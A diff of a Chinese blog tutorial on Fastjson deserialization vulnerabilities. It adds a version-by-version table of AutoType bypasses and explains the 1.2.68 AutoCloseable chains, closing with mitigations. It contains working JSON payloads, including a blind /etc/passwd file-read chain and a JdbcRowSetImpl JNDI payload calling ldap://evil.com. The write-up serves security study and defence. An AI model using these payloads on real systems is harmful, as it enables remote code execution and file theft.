@@ -6,9 +6,56 @@ categories:
   - java反序列化
 ---
 
+# Fastjson 
+
+Fastjson 是阿里巴巴开源的 JSON 解析库，在国内 Java 生态中使用极广。由于其强大的 `AutoType` 功能（允许 JSON 中通过 `@type` 指定类名自动反序列化），也让它成为了安全研究员的重点关注对象。
+
+---
+
+## 一、漏洞根源：AutoType 功能
+
+### 1.1 正常功能 vs 安全风险
+
+```java
+// Fastjson 的核心能力：JSON → Java 对象
+String json = "{\"name\":\"张三\",\"age\":25}";
+User user = JSON.parseObject(json, User.class);  // 安全
+
+// AutoType 功能：允许 JSON 自己指定类名
+String json2 = "{\"@type\":\"com.example.User\",\"name\":\"张三\"}";
+Object obj = JSON.parseObject(json2);  // 危险：攻击者可指定任意类
+```
+
+### 1.2 攻击的起点：JdbcRowSetImpl
+
+攻击者发现 `com.sun.rowset.JdbcRowSetImpl` 类在反序列化时会触发 JNDI 查询：
+
+```java
+// JdbcRowSetImpl 的 connect() 方法
+Context ctx = new InitialContext();
+DataSource ds = (DataSource) ctx.lookup(getDataSourceName());  // JNDI 查询
+```
+
+攻击者可以控制 `dataSourceName` 参数，指向恶意 RMI/LDAP 服务器。
+
+## 二、演变全览图
+
+### 版本演进与攻击方式对照表
+
+| 版本范围          | 核心防御机制                                           | 绕过技巧                                        | 是否需要 AutoType | 攻击效果                    |
+| ----------------- | ------------------------------------------------------ | ----------------------------------------------- | ----------------- | --------------------------- |
+| **≤1.2.24**       | 无防御                                                 | 直接使用 `JdbcRowSetImpl`                       | 否（默认开启）    | JNDI → RCE                  |
+| **1.2.25-1.2.41** | 引入黑白名单<br>默认关闭 AutoType                      | `L类名;` 包裹<br>`[类名` 数组                   | **是**            | JNDI → RCE                  |
+| **1.2.42**        | 黑名单改为哈希值<br>仅做一次首尾检测                   | `LL类名;;` 双写                                 | **是**            | JNDI → RCE                  |
+| **1.2.43**        | 修复 `L/;` 双写                                        | `[类名` 数组                                    | **是**            | JNDI → RCE                  |
+| **1.2.44-1.2.46** | 修复数组绕过                                           | 无公开绕过                                      | —                 | —                           |
+| **1.2.47**        | 缓存机制成为弱点                                       | `java.lang.Class` 预加载                        | **否**            | JNDI → RCE                  |
+| **1.2.48-1.2.67** | 限制 JNDI 类                                           | 利用难度大增                                    | —                 | —                           |
+| **1.2.68**        | JNDI 类被封堵<br>SafeMode 引入<br>放宽 `AutoCloseable` | `expectClass` + `AutoCloseable`<br>+ 第三方依赖 | **否**            | 文件读取 / BCEL / 有限 JNDI |
 
 
-## fastjson<=1.24-jndi
+
+## 三、fastjson<=1.24-jndi
 
 这个漏洞可以通过vulhub复现，首先先讲解我们用到的工具和payload：
 
@@ -141,7 +188,7 @@ RMI服务返回Reference: http://192.168.142.132:8089/LinuxTouch.class
 | 升级到Fastjson v2 | 新项目   | 代码重构，性能更好但不完全兼容                               |
 | 禁用autoType      | 所有版本 | 临时缓解，可能被绕过，后续好几个版本的类似漏洞都是基于绕过autoType |
 
-## fastjson1.24~1.47
+## 四、fastjson1.24~1.47
 
 官方后续多次修复该漏洞，但在这个版本区间内有多种方法绕过黑白名单，再次利用fastjson1.24的漏洞：
 
@@ -425,9 +472,9 @@ method2.invoke(instance, true);  // ← 内部调用connect() → JNDI查找
 
 ------
 
-## 五、反射在1.2.47绕过中的作用
+### 反射在1.2.47绕过中的作用
 
-### 5.1 第一步：通过java.lang.Class反射加载
+#### 第一步：通过java.lang.Class反射加载
 
 ```
 {
@@ -460,7 +507,7 @@ public class ClassDeserializer implements ObjectDeserializer {
 
 
 
-### 5.2 为什么这样能绕过？
+#### 为什么这样能绕过？
 
 ```
 // 正常流程（会检查黑白名单）
@@ -497,4 +544,140 @@ Object value = field.get(对象实例);
 field.setAccessible(true);  // 突破private限制
 field.set(对象实例, 新值);
 ```
+
+
+
+## 五、fastjson1.2.68
+
+1.2.68 版本做了重大加固：
+
+- 大幅扩充黑名单（JNDI 相关类几乎全部被封）
+- 引入 SafeMode（完全禁止 AutoType）
+- 但意外放宽了 `AutoCloseable` 子类的反序列化
+
+#### 5.1为什么还能绕过
+
+`checkAutoType` 中存在一个绕过条件：
+
+```java
+if (expectClass != null) {
+    // expectClass 不在黑名单中，且在 mappings 缓存中
+    // typeName 是 expectClass 的子类
+    // → 绕过检查，直接加载
+}
+```
+
+`java.lang.AutoCloseable` 满足所有条件：
+- 不在黑名单中
+- 在 mappings 缓存中（JDK 内置）
+- 有很多子类
+
+**关键前提**：业务代码中必须存在 `JSON.parseObject(json, AutoCloseable.class)` 这样的调用。
+
+#### 5.2 各利用链的因果关系
+
+```mermaid
+flowchart TD
+    A[1.2.68 安全加固] --> B[JNDI 类被封堵]
+    A --> C[远程类加载被 JDK 限制]
+    A --> D[常见接口被加入黑名单]
+    
+    B --> E[不能直接用 JdbcRowSetImpl]
+    C --> F[不能从 HTTP 下载恶意类]
+    D --> G[不能使用 Object/Serializable 等]
+    
+    E --> H[必须找 AutoCloseable 子类]
+    G --> H
+    
+    H --> I{目标环境有什么？}
+    
+    I -->|有 commons-io| J[文件读取链<br/>BOMInputStream 盲注]
+    I -->|有 bcel| K[BCEL 链<br/>字符串编码类加载]
+    I -->|低版本 JDK| L[有限 JNDI 链]
+    I -->|无依赖| M[异常探测链<br/>AssertionError]
+    
+    C --> K
+    F --> K
+```
+
+#### 5.3 链一：文件读取（BOMInputStream 盲注）
+
+| 项目           | 说明                                                         |
+| -------------- | ------------------------------------------------------------ |
+| **封堵了什么** | JNDI 类被封，无法远程执行代码                                |
+| **转向了什么** | 本地文件读取                                                 |
+| **依赖**       | commons-io                                                   |
+| **Payload 链** | `AutoCloseable` → `BOMInputStream` → `ReaderInputStream` → `URLReader` → `file://` |
+| **回显方式**   | 布尔盲注（BOM 字节不匹配时报错）                             |
+
+```json
+{
+  "abc": {
+    "@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {
+      "@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": {
+        "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///etc/passwd"
+      }
+    },
+    "boms": [{"bytes": [114,111,111,116]}]  // 猜测文件以 "root" 开头
+  }
+}
+```
+
+#### 5.4 链二：BCEL 类加载
+
+| 项目           | 说明                                                 |
+| -------------- | ---------------------------------------------------- |
+| **封堵了什么** | JDK 高版本禁止远程类加载（`trustURLCodebase=false`） |
+| **转向了什么** | 本地 BCEL 类加载（字符串编码）                       |
+| **依赖**       | org.apache.bcel                                      |
+| **原理**       | BCEL 的 ClassLoader 可从 `$$BCEL$$` 字符串加载类     |
+
+```json
+{
+  "@type": "org.apache.bcel.util.ClassLoader",
+  "_bytes": "$$BCEL$$$l$8b...（BCEL 编码的恶意类）"
+}
+```
+
+#### 5.5 链三：有限 JNDI
+
+| 项目           | 说明                                        |
+| -------------- | ------------------------------------------- |
+| **封堵了什么** | JNDI 类被加入黑名单                         |
+| **转向了什么** | 通过 AutoCloseable 仍可使用，但需低版本 JDK |
+| **条件**       | JDK < 8u191（允许 LDAP 远程类加载）         |
+
+```json
+{
+  "@type": "java.lang.AutoCloseable",
+  "@type": "com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName": "ldap://evil.com:1389/Exploit"
+}
+```
+
+## 修复：升级到 Fastjson 2.x
+
+### Fastjson 2.x 的安全机制重构
+Fastjson 2.x 重构了安全机制，不再有 AutoType 风险。
+
+#### 无法升级时的临时方案
+
+```java
+// 方案一：开启 SafeMode（1.2.68+）
+ParserConfig.getGlobalInstance().setSafeMode(true);
+
+// 方案二：关闭 AutoType
+ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
+
+// 方案三：使用第三方库时注意版本
+// commons-io 升级到 2.9.0+（修复了部分 Gadget）
+// bcel 非必要不引入
+```
+
+#### 代码层面
+避免使用 `JSON.parseObject(json, AutoCloseable.class)` 这类接口类作为反序列化目标类型。
 
